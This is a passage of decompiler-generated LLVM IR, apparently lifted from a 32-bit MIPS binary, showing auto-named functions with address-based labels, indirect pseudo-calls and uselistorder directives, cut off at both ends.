dec_label_pc_4067a4:                              ; preds = %dec_label_pc_406780, %dec_label_pc_406748
  %v0_4067dc = phi i32 [ 0, %dec_label_pc_406748 ], [ %v0_406784, %dec_label_pc_406780 ]
  %v0_4067e4 = phi i32 [ %v2_40676c, %dec_label_pc_406748 ], [ %v3_406788, %dec_label_pc_406780 ]
  %v1_4067a4 = inttoptr i32 %v0_4067e4 to i32*
  %v2_4067a4 = load i32, i32* %v1_4067a4, align 4
  %v2_4067ac = sub i32 %v0_4067e4, %v2_4067a4
  %v1_4067b0 = add i32 %v2_4067ac, 12
  %v2_4067b4 = icmp ult i32 %v2_406770, %v1_4067b0
  br i1 %v2_4067b4, label %dec_label_pc_406874, label %dec_label_pc_4067bc

dec_label_pc_4067bc:                              ; preds = %dec_label_pc_4067a4
  %v2_4067c0 = icmp eq i32 %v1_4067b0, %v2_406770
  %v5_4067c0 = add i32 %v2_4067a4, %v1_406770
  store i32 %v5_4067c0, i32* %s2.global-to-local, align 4
  br i1 %v2_4067c0, label %dec_label_pc_4067c4, label %dec_label_pc_4067fc

dec_label_pc_4067c4:                              ; preds = %dec_label_pc_4067bc
  %v1_4067c8 = icmp ne i32 %v0_4067dc, 0
  %v3_4067c8 = add i32 %v0_4067dc, 12
  %v2_4067d0 = icmp eq i32 %v3_4067c8, %arg2
  %or.cond1 = and i1 %v1_4067c8, %v2_4067d0
  br i1 %or.cond1, label %dec_label_pc_4067d4, label %dec_label_pc_406868

dec_label_pc_4067d4:                              ; preds = %dec_label_pc_4067c4
  %v3_4067d8 = load i32, i32* @global_var_449a80.88, align 4
  store i32 %v3_4067d8, i32* %t9.global-to-local, align 4
  %v1_4067dc = inttoptr i32 %v0_4067dc to i32*
  %v2_4067dc = load i32, i32* %v1_4067dc, align 4
  %v1_4067e0 = add i32 %v0_4067dc, 8
  %v2_4067e0 = inttoptr i32 %v1_4067e0 to i32*
  %v3_4067e0 = load i32, i32* %v2_4067e0, align 4
  store i32 %v3_4067e0, i32* %a2.global-to-local, align 4
  %v1_4067e8 = add i32 %v3_4067d8, 26412
  store i32 %v1_4067e8, i32* %t9.global-to-local, align 4
  %v3_4067ec = add i32 %v2_4067dc, %v5_4067c0
  store i32 %v3_4067ec, i32* %s2.global-to-local, align 4
  call void @__pseudo_call(i32 %v1_4067e8)
  %v0_4067fc.pre = load i32, i32* %s0.global-to-local, align 4
  br label %dec_label_pc_4067fc

dec_label_pc_4067fc:                              ; preds = %dec_label_pc_4067bc, %dec_label_pc_4067d4
  %v0_4067fc = phi i32 [ %v0_4067e4, %dec_label_pc_4067bc ], [ %v0_4067fc.pre, %dec_label_pc_4067d4 ]
  %v1_4067fc = add i32 %v0_4067fc, 4
  %v2_4067fc = inttoptr i32 %v1_4067fc to i32*
  %v3_4067fc = load i32, i32* %v2_4067fc, align 4
  store i32 %v3_4067fc, i32* %s1.global-to-local, align 4
  %v1_406804 = icmp eq i32 %v3_4067fc, 0
  br i1 %v1_406804, label %dec_label_pc_406848, label %dec_label_pc_406808

dec_label_pc_406808:                              ; preds = %dec_label_pc_4067fc
  %v1_40680c = inttoptr i32 %v3_4067fc to i32*
  %v2_40680c = load i32, i32* %v1_40680c, align 4
  %v2_406814 = sub i32 %v3_4067fc, %v2_40680c
  %v1_406818 = add i32 %v2_406814, 12
  %v0_40681c = load i32, i32* %t0.global-to-local, align 4
  %v2_40681c = icmp eq i32 %v0_40681c, %v1_406818
  br i1 %v2_40681c, label %dec_label_pc_406820, label %dec_label_pc_406848

dec_label_pc_406820:                              ; preds = %dec_label_pc_406808
  %v3_406824 = load i32, i32* @global_var_449a80.88, align 4
  %v0_406828 = load i32, i32* %t1.global-to-local, align 4
  store i32 %v0_406828, i32* %a2.global-to-local, align 4
  %v1_406830 = add i32 %v3_406824, 26412
  store i32 %v1_406830, i32* %t9.global-to-local, align 4
  %v1_406834 = load i32, i32* %s2.global-to-local, align 4
  %v3_406834 = add i32 %v1_406834, %v2_40680c
  store i32 %v3_406834, i32* %s2.global-to-local, align 4
  call void @__pseudo_call(i32 %v1_406830)
  %v0_406844 = load i32, i32* %s1.global-to-local, align 4
  store i32 %v0_406844, i32* %s0.global-to-local, align 4
  br label %dec_label_pc_406848

dec_label_pc_406848:                              ; preds = %dec_label_pc_406808, %dec_label_pc_4067fc, %dec_label_pc_406820
  %v0_40684c = phi i32 [ %v0_4067fc, %dec_label_pc_406808 ], [ %v0_4067fc, %dec_label_pc_4067fc ], [ %v0_406844, %dec_label_pc_406820 ]
  %v3_406848 = load i32, i32* @global_var_449a80.88, align 4
  %v1_40684c = load i32, i32* %a2.global-to-local, align 4
  %v2_40684c = add i32 %v1_40684c, %v0_40684c
  store i32 %v2_40684c, i32* %s0.global-to-local, align 4
  %v0_406854 = load i32, i32* %t1.global-to-local, align 4
  store i32 %v0_406854, i32* %a2.global-to-local, align 4
  %v1_406858 = add i32 %v3_406848, 26368
  store i32 %v1_406858, i32* %t9.global-to-local, align 4
  call void @__pseudo_call(i32 %v1_406858)
  %v0_406870.pre = load i32, i32* %s2.global-to-local, align 4
  br label %dec_label_pc_406868

dec_label_pc_406868:                              ; preds = %dec_label_pc_4067c4, %dec_label_pc_406848
  %v0_406870 = phi i32 [ %v5_4067c0, %dec_label_pc_4067c4 ], [ %v0_406870.pre, %dec_label_pc_406848 ]
  %v0_406868 = phi i32 [ %v0_4067e4, %dec_label_pc_4067c4 ], [ %v2_40684c, %dec_label_pc_406848 ]
  store i32 %v0_406868, i32* %s1.global-to-local, align 4
  %v2_406870 = inttoptr i32 %v0_406868 to i32*
  store i32 %v0_406870, i32* %v2_406870, align 4
  %v0_406878.pre = load i32, i32* %t0.global-to-local, align 4
  %v0_40687c.pre = load i32, i32* %a2.global-to-local, align 4
  br label %dec_label_pc_406874

dec_label_pc_406874:                              ; preds = %dec_label_pc_4067a4, %dec_label_pc_406868
  %v0_40687c = phi i32 [ %v1_406770, %dec_label_pc_4067a4 ], [ %v0_40687c.pre, %dec_label_pc_406868 ]
  %v0_406878 = phi i32 [ %v2_406770, %dec_label_pc_4067a4 ], [ %v0_406878.pre, %dec_label_pc_406868 ]
  %v3_406874 = load i32, i32* @global_var_449a80.88, align 4
  store i32 %v3_406874, i32* %t9.global-to-local, align 4
  %v1_406878 = add i32 %v0_406878, -12
  store i32 %v1_406878, i32* %s1.global-to-local, align 4
  %v3_40687c = inttoptr i32 %v1_406878 to i32*
  store i32 %v0_40687c, i32* %v3_40687c, align 4
  %v0_406880 = load i32, i32* %s0.global-to-local, align 4
  store i32 %v0_406880, i32* @a3, align 4
  %v0_406884 = load i32, i32* %t1.global-to-local, align 4
  store i32 %v0_406884, i32* %a2.global-to-local, align 4
  %v0_406888 = load i32, i32* %t9.global-to-local, align 4
  %v1_406888 = add i32 %v0_406888, 26368
  store i32 %v1_406888, i32* %t9.global-to-local, align 4
  call void @__pseudo_call(i32 %v1_406888)
  %v0_406898 = load i32, i32* %s1.global-to-local, align 4
  ret i32 %v0_406898

; uselistorder directives
  uselistorder i32 %v0_406868, { 1, 0 }
  uselistorder i32 %v3_4067fc, { 1, 0, 2, 3 }
  uselistorder i32 %v5_4067c0, { 1, 0, 2 }
  uselistorder i32 %v0_4067e4, { 0, 1, 3, 2 }
  uselistorder i32 %v0_4067dc, { 1, 0, 3, 2 }
  uselistorder i32 %v3_406788, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v0_406784, { 0, 2, 1 }
  uselistorder i32 %v1_406770, { 2, 0, 1 }
  uselistorder i32 %v2_40676c, { 1, 0, 2 }
  uselistorder i32* %t1.global-to-local, { 1, 2, 3, 0, 4 }
  uselistorder i32* %t0.global-to-local, { 1, 0, 2 }
  uselistorder i32* %s2.global-to-local, { 3, 0, 2, 1, 4 }
  uselistorder i32* %s0.global-to-local, { 3, 0, 1, 4, 2, 5 }
  uselistorder i32* %a2.global-to-local, { 2, 3, 4, 6, 5, 7, 0, 1 }
  uselistorder i32 %arg2, { 1, 2, 0 }
  uselistorder label %dec_label_pc_406874, { 1, 0 }
  uselistorder label %dec_label_pc_406868, { 1, 0 }
  uselistorder label %dec_label_pc_406848, { 2, 0, 1 }
  uselistorder label %dec_label_pc_4067fc, { 1, 0 }
  uselistorder label %dec_label_pc_406780, { 1, 0 }
}

define i32 @function_4068c0(i32 %arg1) local_unnamed_addr {
dec_label_pc_4068c0:
  %s1.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v2_4068ec = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_4068ec, i32* @s0, align 4
  store i32 %arg1, i32* %s1.global-to-local, align 4
  %v5_4068f4 = call i32 @function_406e6c(i32 %v2_4068ec, i32 ptrtoint (i32* @global_var_406e64.199 to i32))
  %v3_406908 = load i32, i32* bitcast (i32** @global_var_449b94.234 to i32*), align 4
  %v2_40690c = call i32 @function_406e64(i32 %v3_406908)
  %v3_40691c = load i32, i32* bitcast (i32** @global_var_449a98.236 to i32*), align 4
  store i32 %v3_40691c, i32* @v0, align 4
  %v1_40692c = icmp eq i32 %v3_40691c, 0
  br i1 %v1_40692c, label %dec_label_pc_406944, label %dec_label_pc_406930

dec_label_pc_406930:                              ; preds = %dec_label_pc_4068c0
  store i32 4221244, i32* @ra, align 4
  call void @__pseudo_call(i32 %v3_40691c)
  br label %dec_label_pc_406944

dec_label_pc_406944:                              ; preds = %dec_label_pc_4068c0, %dec_label_pc_406930
  %v3_40694c = call i32 @function_406e6c(i32 %v2_4068ec, i32 1)
  %v3_40695c = load i32, i32* @global_var_449d0c.237, align 4
  store i32 %v3_40695c, i32* @t9, align 4
  %v1_406964 = call i32 @function_406da0()
  %v3_406974 = load i32, i32* @global_var_449ba0.238, align 4
  %v1_40697c = icmp eq i32 %v3_406974, 0
  br i1 %v1_40697c, label %dec_label_pc_40699c, label %dec_label_pc_406980

dec_label_pc_406980:                              ; preds = %dec_label_pc_406944
  %v1_40698c = call i32 @unknown_0()
  br label %dec_label_pc_40699c

dec_label_pc_40699c:                              ; preds = %dec_label_pc_406944, %dec_label_pc_406980
  %v3_40699c = load i32, i32* @global_var_449bbc.239, align 4
  store i32 %v3_40699c, i32* @t9, align 4
  %v1_4069a4 = load i32, i32* %s1.global-to-local, align 4
  %v3_4069a4 = call i32 @function_407440(i32 %v1_4069a4)
  unreachable

; uselistorder directives
  uselistorder i32 (i32)* @function_406e64, { 13, 8, 7, 6, 5, 4, 3, 2, 1, 0, 12, 11, 10, 9 }
  uselistorder label %dec_label_pc_40699c, { 1, 0 }
  uselistorder label %dec_label_pc_406944, { 1, 0 }
}

define i32 @function_4069b0(i32 %arg1) local_unnamed_addr {
dec_label_pc_4069b0:
  %a0.global-to-local = alloca i32, align 4
  %a1.global-to-local = alloca i32, align 4
  %gp.global-to-local = alloca i32, align 4
  %s0.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  %v1.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %a0.global-to-local, align 4
  %tmp6 = alloca i32, align 4
  %tmp8 = alloca i32, align 4
  %tmp9 = alloca i32, align 4
  %tmp10 = alloca i32, align 4
  %v1_4069b8 = load i32, i32* @t9, align 4
  %v2_4069b8 = add i32 %v1_4069b8, 307376
  store i32 %v2_4069b8, i32* @gp, align 4
  %v4_4069d0 = ptrtoint i32* %tmp6 to i32
  %v1_4069d8 = icmp eq i32 %arg1, 0
  store i32 32, i32* %v1.global-to-local, align 4
  br i1 %v1_4069d8, label %dec_label_pc_406bbc, label %dec_label_pc_4069dc

dec_label_pc_4069dc:                              ; preds = %dec_label_pc_4069b0
  %v2_4069e4 = ptrtoint i32* %tmp8 to i32
  store i32 %v2_4069e4, i32* %a1.global-to-local, align 4
  %v0_4069e8.pre = load i32, i32* @v0, align 4
  br label %dec_label_pc_4069e8

dec_label_pc_4069e8:                              ; preds = %dec_label_pc_4069e8, %dec_label_pc_4069dc
  %v0_4069e8 = phi i32 [ %v4_4069f4, %dec_label_pc_4069e8 ], [ %v0_4069e8.pre, %dec_label_pc_4069dc ]
  %v1_4069e8 = add i32 %v0_4069e8, 8
  %v2_4069e8 = inttoptr i32 %v1_4069e8 to i32*
  store i32 0, i32* %v2_4069e8, align 4
  %v0_4069ec = load i32, i32* %v1.global-to-local, align 4
  %v1_4069ec = add i32 %v0_4069ec, -1
  store i32 %v1_4069ec, i32* %v1.global-to-local, align 4
  %v1_4069f0 = mul i32 %v1_4069ec, 4
  %v1_4069f4 = icmp sgt i32 %v1_4069ec, -1
  %v3_4069f4 = load i32, i32* %a1.global-to-local, align 4
  %v4_4069f4 = add i32 %v3_4069f4, %v1_4069f0
  store i32 %v4_4069f4, i32* %v0.global-to-local, align 4
  br i1 %v1_4069f4, label %dec_label_pc_4069e8, label %dec_label_pc_4069f8

dec_label_pc_4069f8:                              ; preds = %dec_label_pc_4069e8
  %v3_4069fc = load i32, i32* @global_var_449c64.213, align 4
  store i32 %v3_4069fc, i32* @t9, align 4
  %v2_406a00 = ptrtoint i32* %tmp9 to i32
  store i32 %arg1, i32* %tmp8, align 4
  store i32 %v2_406a00, i32* %a0.global-to-local, align 4
  store i32 18, i32* %a1.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_4069fc)
  store i32 %v2_4069b8, i32* @gp, align 4
  %v0_406a1c = load i32, i32* %v0.global-to-local, align 4
  %v1_406a1c = icmp slt i32 %v0_406a1c, 0
  %v4_406a1c = ptrtoint i32* %tmp10 to i32
  store i32 %v4_406a1c, i32* %s0.global-to-local, align 4
  br i1 %v1_406a1c, label %dec_label_pc_406bc4, label %dec_label_pc_406a20

dec_label_pc_406a20:                              ; preds = %dec_label_pc_4069f8
  %v3_406a24 = load i32, i32* @global_var_449c44.240, align 4
  store i32 %v3_406a24, i32* @t9, align 4
  store i32 %v2_406a00, i32* %a1.global-to-local, align 4
  store i32 1, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_406a24)
  store i32 %v2_4069b8, i32* @gp, align 4
  %v0_406a3c = load i32, i32* %v0.global-to-local, align 4
  %v1_406a3c = icmp eq i32 %v0_406a3c, 0
  store i32 -1, i32* %v0.global-to-local, align 4
  br i1 %v1_406a3c, label %dec_label_pc_406a40, label %dec_label_pc_406bc8

dec_label_pc_406a40:                              ; preds = %dec_label_pc_406a20
  %v3_406a44 = load i32, i32* @global_var_449be4.214, align 4
  store i32 %v4_406a1c, i32* %a0.global-to-local, align 4
  store i32 18, i32* %a1.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_406a44)
  store i32 %v2_4069b8, i32* %gp.global-to-local, align 4
  %v0_406a58 = load i32, i32* %v0.global-to-local, align 4
  %v1_406a58 = icmp eq i32 %v0_406a58, 0
  store i32 32, i32* %v1.global-to-local, align 4
  br i1 %v1_406a58, label %dec_label_pc_406a5c, label %dec_label_pc_406a40.dec_label_pc_406b80_crit_edge

dec_label_pc_406a40.dec_label_pc_406b80_crit_edge: ; preds = %dec_label_pc_406a40
  %v3_406b84.pre = load i32, i32* @global_var_449c60.242, align 4
  br label %dec_label_pc_406b80

dec_label_pc_406a5c:                              ; preds = %dec_label_pc_406a40
  store i32 %v2_4069e4, i32* %a0.global-to-local, align 4
  br label %dec_label_pc_406a68

dec_label_pc_406a68:                              ; preds = %dec_label_pc_406a68, %dec_label_pc_406a5c
  %v0_406a68 = phi i32 [ %v4_406a74, %dec_label_pc_406a68 ], [ 0, %dec_label_pc_406a5c ]
  %v1_406a68 = add i32 %v0_406a68, 8
  %v2_406a68 = inttoptr i32 %v1_406a68 to i32*
  store i32 0, i32* %v2_406a68, align 4
  %v0_406a6c = load i32, i32* %v1.global-to-local, align 4
  %v1_406a6c = add i32 %v0_406a6c, -1
  store i32 %v1_406a6c, i32* %v1.global-to-local, align 4
  %v1_406a70 = mul i32 %v1_406a6c, 4
  %v1_406a74 = icmp sgt i32 %v1_406a6c, -1
  %v3_406a74 = load i32, i32* %a0.global-to-local, align 4
  %v4_406a74 = add i32 %v3_406a74, %v1_406a70
  store i32 %v4_406a74, i32* %v0.global-to-local, align 4
  br i1 %v1_406a74, label %dec_label_pc_406a68, label %dec_label_pc_406a78

dec_label_pc_406a78:                              ; preds = %dec_label_pc_406a68
  %v3_406a7c = load i32, i32* @global_var_449c64.213, align 4
  store i32 %v3_406a7c, i32* @t9, align 4
  store i32 %v2_406a00, i32* %a0.global-to-local, align 4
  store i32 18, i32* %a1.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_406a7c)
  store i32 %v2_4069b8, i32* @gp, align 4
  %v0_406a90 = load i32, i32* %v0.global-to-local, align 4
  %v1_406a90 = icmp slt i32 %v0_406a90, 0
  store i32 18, i32* %a0.global-to-local, align 4
  br i1 %v1_406a90, label %dec_label_pc_406bc4, label %dec_label_pc_406a94

dec_label_pc_406a94:                              ; preds = %dec_label_pc_406a78
  %v3_406a98 = load i32, i32* @global_var_449d28.217, align 4
  store i32 0, i32* %a1.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_406a98)
  store i32 %v2_4069b8, i32* %gp.global-to-local, align 4
  %v0_406aac = load i32, i32* %v0.global-to-local, align 4
  %v1_406aac = icmp sgt i32 %v0_406aac, -1
  store i32 %v2_4069e4, i32* %s0.global-to-local, align 4
  br i1 %v1_406aac, label %dec_label_pc_406b58, label %dec_label_pc_406ab0

dec_label_pc_406ab0:                              ; preds = %dec_label_pc_406a94
  %v3_406ab4 = load i32, i32* @global_var_449b6c.83, align 4
  call void @__pseudo_call(i32 %v3_406ab4)
  store i32 %v2_4069b8, i32* %gp.global-to-local, align 4
  store i32 3, i32* %a0.global-to-local, align 4
  %v3_406acc = load i32, i32* @global_var_449c44.240, align 4
  store i32 %v4_406a1c, i32* %a1.global-to-local, align 4
  %v0_406ad8 = load i32, i32* %v0.global-to-local, align 4
  %v1_406ad8 = inttoptr i32 %v0_406ad8 to i32*
  %v2_406ad8 = load i32, i32* %v1_406ad8, align 4
  store i32 %v0_406ad8, i32* %s0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_406acc)
  store i32 %v2_4069b8, i32* %gp.global-to-local, align 4
  store i32 -1, i32* %v0.global-to-local, align 4
  %v2_406af0 = inttoptr i32 %v0_406ad8 to i32*
  store i32 %v2_406ad8, i32* %v2_406af0, align 4
  %v0_406b08.pre = load i32, i32* %s0.global-to-local, align 4
  br label %dec_label_pc_406b58

dec_label_pc_406b58:                              ; preds = %dec_label_pc_406a94, %dec_label_pc_406ab0
  %v0_406b08 = phi i32 [ %v2_4069e4, %dec_label_pc_406a94 ], [ %v0_406b08.pre, %dec_label_pc_406ab0 ]
  store i32 1, i32* %v0.global-to-local, align 4
  %v3_406b04 = load i32, i32* @global_var_449c60.242, align 4
  store i32 %v0_406b08, i32* %a0.global-to-local, align 4
  store i32 %v0_406b08, i32* %a1.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_406b04)
  store i32 %v2_4069b8, i32* %gp.global-to-local, align 4
  %v3_406b1c = load i32, i32* @global_var_449b6c.83, align 4
  call void @__pseudo_call(i32 %v3_406b1c)
  store i32 %v2_4069b8, i32* %gp.global-to-local, align 4
  store i32 %v4_406a1c, i32* %a1.global-to-local, align 4
  %v3_406b34 = load i32, i32* @global_var_449c44.240, align 4
  store i32 3, i32* %a0.global-to-local, align 4
  %v0_406b40 = load i32, i32* %v0.global-to-local, align 4
  %v1_406b40 = inttoptr i32 %v0_406b40 to i32*
  %v2_406b40 = load i32, i32* %v1_406b40, align 4
  store i32 %v2_406b40, i32* %s0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_406b34)
  store i32 %v2_4069b8, i32* %gp.global-to-local, align 4
  %v2_406b54 = inttoptr i32 %v0_406b40 to i32*
  store i32 %v2_406b40, i32* %v2_406b54, align 4
  %v0_406b58 = load i32, i32* %gp.global-to-local, align 4
  %v1_406b58 = add i32 %v0_406b58, -32284
  %v2_406b58 = inttoptr i32 %v1_406b58 to i32*
  %v3_406b58 = load i32, i32* %v2_406b58, align 4
  store i32 %v4_406a1c, i32* %a1.global-to-local, align 4
  store i32 3, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_406b58)
  store i32 %v2_4069b8, i32* %gp.global-to-local, align 4
  %v0_406b70 = load i32, i32* %s0.global-to-local, align 4
  store i32 %v0_406b70, i32* %a0.global-to-local, align 4
  %v3_406b74 = load i32, i32* @global_var_449c60.242, align 4
  store i32 %v0_406b70, i32* %a1.global-to-local, align 4
  br label %dec_label_pc_406b80

dec_label_pc_406b80:                              ; preds = %dec_label_pc_406a40.dec_label_pc_406b80_crit_edge, %dec_label_pc_406b58
  %v3_406b84 = phi i32 [ %v3_406b84.pre, %dec_label_pc_406a40.dec_label_pc_406b80_crit_edge ], [ %v3_406b74, %dec_label_pc_406b58 ]
  store i32 %v2_4069e4, i32* %a0.global-to-local, align 4
  store i32 %v3_406b84, i32* @t9, align 4
  store i32 %v2_4069e4, i32* %a1.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_406b84)
  store i32 %v2_4069b8, i32* @gp, align 4
  %v0_406b98 = load i32, i32* %v0.global-to-local, align 4
  %v1_406b9c = icmp eq i32 %v0_406b98, 0
  store i32 499974144, i32* %v1.global-to-local, align 4
  br i1 %v1_406b9c, label %dec_label_pc_406bbc, label %dec_label_pc_406ba0

dec_label_pc_406ba0:                              ; preds = %dec_label_pc_406b80
  %v3_406bb0 = load i32, i32* %tmp8, align 4
  store i32 %v3_406bb0, i32* %v1.global-to-local, align 4
  store i32 %v3_406bb0, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_406bbc

dec_label_pc_406bbc:                              ; preds = %dec_label_pc_406b80, %dec_label_pc_4069b0, %dec_label_pc_406ba0
  store i32 0, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_406bc4

dec_label_pc_406bc4:                              ; preds = %dec_label_pc_406a78, %dec_label_pc_4069f8, %dec_label_pc_406bbc
  store i32 -1, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_406bc8

dec_label_pc_406bc8:                              ; preds = %dec_label_pc_406a20, %dec_label_pc_406bc4
  store i32 %v4_4069d0, i32* @s0, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v3_406b84, { 1, 0 }
  uselistorder i32 %v0_406b08, { 1, 0 }
  uselistorder i32 %v4_406a74, { 1, 0 }
  uselistorder i32 %v1_406a6c, { 1, 0, 2 }
  uselistorder i32 %v4_406a1c, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v4_4069f4, { 1, 0 }
  uselistorder i32 %v1_4069ec, { 1, 0, 2 }
  uselistorder i32 %v2_4069e4, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 %v2_4069b8, { 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0, 12 }
  uselistorder i32* %tmp8, { 2, 1, 0 }
  uselistorder i32* %v0.global-to-local, { 0, 1, 2, 10, 3, 4, 5, 6, 7, 8, 9, 11, 12, 13, 14, 15 }
  uselistorder i32* %a0.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0 }
  uselistorder i32* @global_var_449c60.242, { 1, 2, 0 }
  uselistorder i32* @gp, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_406bc8, { 1, 0 }
  uselistorder label %dec_label_pc_406bc4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_406bbc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_406b80, { 1, 0 }
  uselistorder label %dec_label_pc_406b58, { 1, 0 }
}

define i32 @function_406bf0(i32 %arg1) local_unnamed_addr {
dec_label_pc_406bf0:
  %v1_406c08 = icmp ult i32 %arg1, 150
  %v1_406c0c = icmp eq i1 %v1_406c08, false
  br i1 %v1_406c0c, label %dec_label_pc_406c40, label %dec_label_pc_406c10

dec_label_pc_406c10:                              ; preds = %dec_label_pc_406bf0
  %v3_406c0c = mul i32 %arg1, 4
  %v1_406bf8 = load i32, i32* @t9, align 4
  %v2_406bf8 = add i32 %v1_406bf8, 306800
  %v2_406c20 = add i32 %v3_406c0c, ptrtoint (i32* @global_var_409640.246 to i32)
  %v1_406c24 = inttoptr i32 %v2_406c20 to i32*
  %v2_406c24 = load i32, i32* %v1_406c24, align 4
  %v2_406c2c = add i32 %v2_406c24, %v2_406bf8
  call void @__pseudo_branch(i32 %v2_406c2c)
  br label %dec_label_pc_406c40

dec_label_pc_406c40:                              ; preds = %dec_label_pc_406bf0, %dec_label_pc_406c10
  %v3_406c40 = load i32, i32* @global_var_449b6c.83, align 4
  store i32 %v3_406c40, i32* @t9, align 4
  %v1_406c48 = call i32 @function_4057a0()
  %v2_406c60 = inttoptr i32 %v1_406c48 to i32*
  store i32 22, i32* %v2_406c60, align 4
  %v3_406c90 = load i32, i32* @global_var_449d1c.248, align 4
  store i32 %v3_406c90, i32* @t9, align 4
  %v5_406c98 = call i32 @function_407930(i32 6)
  %v3_406cf0 = load i32, i32* @global_var_449d00.249, align 4
  store i32 %v3_406cf0, i32* @t9, align 4
  %v4_406cf8 = call i32 @function_407490(i32 1, %timespec* null)
  %v1_406d04 = icmp sgt i32 %v4_406cf8, -1
  br i1 %v1_406d04, label %dec_label_pc_406d28, label %dec_label_pc_406d08

dec_label_pc_406d08:                              ; preds = %dec_label_pc_406c40
  br label %dec_label_pc_406d28

dec_label_pc_406d28:                              ; preds = %dec_label_pc_406c40, %dec_label_pc_406d08
  ret i32 32767

; uselistorder directives
  uselistorder i32 150, { 1, 0, 2 }
  uselistorder label %dec_label_pc_406d28, { 1, 0 }
  uselistorder label %dec_label_pc_406c40, { 1, 0 }
}

define i32 @function_406da0() local_unnamed_addr {
dec_label_pc_406da0:
  %s0.global-to-local = alloca i32, align 4
  %v1_406da8 = load i32, i32* @t9, align 4
  %v0_406db0 = load i32, i32* @ra, align 4
  %v0_406db4 = load i32, i32* @s0, align 4
  %v1_406dbc = add i32 %v1_406da8, 273664
  %v2_406dbc = inttoptr i32 %v1_406dbc to i32*
  %v3_406dbc = load i32, i32* %v2_406dbc, align 4
  %v3_406dc0 = load i32, i32* @global_var_449aa0, align 4
  %v2_406dc8 = sub i32 %v3_406dbc, %v3_406dc0
  %v1_406dd0 = sdiv i32 %v2_406dc8, 4
  store i32 %v1_406dd0, i32* %s0.global-to-local, align 4
  br label %dec_label_pc_406dd4

dec_label_pc_406dd4:                              ; preds = %dec_label_pc_406dd4, %dec_label_pc_406da0
  %v0_406dd4 = phi i32 [ %v2_406df4, %dec_label_pc_406dd4 ], [ %v3_406dc0, %dec_label_pc_406da0 ]
  %v1_406dd4 = inttoptr i32 %v0_406dd4 to i32*
  %v2_406dd4 = load i32, i32* %v1_406dd4, align 4
  call void @__pseudo_call(i32 %v2_406dd4)
  %v0_406de8 = load i32, i32* %s0.global-to-local, align 4
  %v1_406de8 = add i32 %v0_406de8, -1
  store i32 %v1_406de8, i32* %s0.global-to-local, align 4
  %v3_406dec = load i32, i32* @global_var_449aa0, align 4
  %v1_406df0 = mul i32 %v1_406de8, 4
  %v2_406df4 = add i32 %v3_406dec, %v1_406df0
  %v2_406dfc = icmp eq i32 %v0_406de8, 0
  br i1 %v2_406dfc, label %dec_label_pc_406e00, label %dec_label_pc_406dd4

dec_label_pc_406e00:                              ; preds = %dec_label_pc_406dd4
  %v1_406e04 = add i32 %v1_406da8, 273668
  %v2_406e04 = inttoptr i32 %v1_406e04 to i32*
  %v3_406e04 = load i32, i32* %v2_406e04, align 4
  %v1_406e0c = inttoptr i32 %v3_406e04 to i32*
  %v2_406e0c = load i32, i32* %v1_406e0c, align 4
  %v1_406e14 = icmp eq i32 %v2_406e0c, 0
  br i1 %v1_406e14, label %dec_label_pc_406e2c, label %dec_label_pc_406e18

dec_label_pc_406e18:                              ; preds = %dec_label_pc_406e00
  call void @__pseudo_call(i32 %v2_406e0c)
  br label %dec_label_pc_406e2c

dec_label_pc_406e2c:                              ; preds = %dec_label_pc_406e00, %dec_label_pc_406e18
  %v3_406e2c = load i32, i32* bitcast (i32** @global_var_449aa8.253 to i32*), align 4
  %v1_406e3c = icmp eq i32 %v3_406e2c, 0
  br i1 %v1_406e3c, label %dec_label_pc_406e2c.dec_label_pc_406e54_crit_edge, label %dec_label_pc_406e40

dec_label_pc_406e2c.dec_label_pc_406e54_crit_edge: ; preds = %dec_label_pc_406e2c
  br label %dec_label_pc_406e54

dec_label_pc_406e40:                              ; preds = %dec_label_pc_406e2c
  store i32 %v0_406db4, i32* %s0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v3_406e2c)
  br label %dec_label_pc_406e54

dec_label_pc_406e54:                              ; preds = %dec_label_pc_406e2c.dec_label_pc_406e54_crit_edge, %dec_label_pc_406e40
  store i32 %v0_406db0, i32* @ra, align 4
  store i32 %v0_406db4, i32* @s0, align 4
  ret i32 %v3_406e2c

; uselistorder directives
  uselistorder i32 %v3_406e2c, { 1, 0, 2 }
  uselistorder i32 %v0_406db4, { 1, 0 }
  uselistorder label %dec_label_pc_406e54, { 1, 0 }
  uselistorder label %dec_label_pc_406e2c, { 1, 0 }
}

define i32 @function_406e64(i32 %arg1) local_unnamed_addr {
dec_label_pc_406e64:
  ret i32 0
}

define i32 @function_406e6c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_406e6c:
  %v1_406e6c = load i32, i32* @v0, align 4
  ret i32 %v1_406e6c
}

define i32 @function_406e74(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_406e74:
  store i32 %arg1, i32* @a0, align 4
  %v3_406e94 = load i32, i32* @global_var_449a8c.204, align 4
  store i32 %v3_406e94, i32* @t9, align 4
  store i32 %arg2, i32* @s1, align 4
  store i32 1, i32* @a1, align 4
